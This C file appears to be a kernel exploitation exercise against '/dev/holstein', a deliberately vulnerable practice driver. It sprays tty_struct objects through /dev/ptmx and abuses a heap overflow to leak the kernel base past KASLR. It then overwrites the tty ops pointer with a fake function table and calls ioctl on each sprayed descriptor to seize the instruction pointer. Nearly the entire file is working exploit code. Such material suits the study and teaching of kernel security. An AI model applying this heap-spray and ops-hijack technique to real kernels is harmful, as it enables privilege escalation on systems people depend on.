#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define ofs_tty_ops 0xc38880

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

unsigned long kbase, g_buf;

void main()
{
  int spray[100];
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1)
    fatal("/dev/holstein");

  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  // KASLR
  char buf[0x500];
  read(fd, buf, 0x500);
  kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
  printf("[+] kbase = 0x%016lx\n", kbase);

  // g_buf address leak -- buf[0x438] points to itself
  g_buf = *(unsigned long*)&buf[0x438] - 0x438;
  printf("[+] g_buf = 0x%016lx\n", g_buf);

  // write a fake function table and point `->ops` of the victim tty_struct to
  // it. The resulting crash dump will tell us what is the address assigned to
  // the RIP.
  unsigned  long *p = (unsigned  long *)&buf; 
  for (int i = 0; i < 0x40; i++) { 
    *p++ = 0xffffffffdead0000 + (i << 8); 
  } 
  *(unsigned  long *)&buf[0x418] = g_buf; 
  write(fd, buf, 0x420);
  
  // RIP control 
  for (int i = 0; i < 100 ; i++) { 
    ioctl(spray[i], 0xdeadbeef, 0xcafebabe) ; 
  }
}
